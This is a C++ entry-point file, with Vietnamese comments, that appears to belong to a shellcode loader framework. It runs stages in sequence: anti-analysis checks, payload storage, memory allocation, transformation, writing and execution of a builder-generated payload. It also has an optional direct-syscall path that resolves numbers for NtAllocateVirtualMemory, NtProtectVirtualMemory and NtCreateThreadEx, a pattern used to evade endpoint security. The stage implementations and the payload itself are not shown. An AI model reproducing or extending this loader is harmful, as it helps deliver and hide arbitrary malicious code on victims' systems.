// src/main.cpp

// Include các tiện ích cốt lõi
#include "core/utils.h"

// Include file tổng hợp các kỹ thuật (Recipes)
#include "techniques/context.h"
#include "techniques/runner/T0_antianalysis.h"
#include "techniques/runner/T1_storage.h"
#include "techniques/runner/T2_allocation.h"
#include "techniques/runner/T3_transformation.h"
#include "techniques/runner/T4_writing.h"
#include "techniques/runner/T5_execution.h"

// File này được sinh bởi builder, không edit thủ công
#include "payload_data.h"

PVOID g_syscall_addr = NULL;
DWORD g_ssn_NtAllocateVirtualMemory = 0;
DWORD g_ssn_NtProtectVirtualMemory = 0;
DWORD g_ssn_NtCreateThreadEx = 0;
DWORD g_ssn_NtWaitForSingleObject = 0;

// --- Entry Point ---
extern "C" int main() {

    DEBUG_MSG("Start", "Technique runner start");

#ifdef USE_DIRECT_SYSCALLS
    if (!InitializeSyscalls()) return 1;
#endif

    TechniqueContext ctx = {0};

    if (!Run_T0_AntiAnalysis(&ctx)) return 1;
    if (!Run_T1_Storage(&ctx))      return 1;
    if (!Run_T2_Allocation(&ctx))   return 1;
    if (!Run_T3_Transform(&ctx))    return 1;
    if (!Run_T4_Write(&ctx))        return 1;
    if (!Run_T5_Execute(&ctx))      return 1;

    return 0;
}
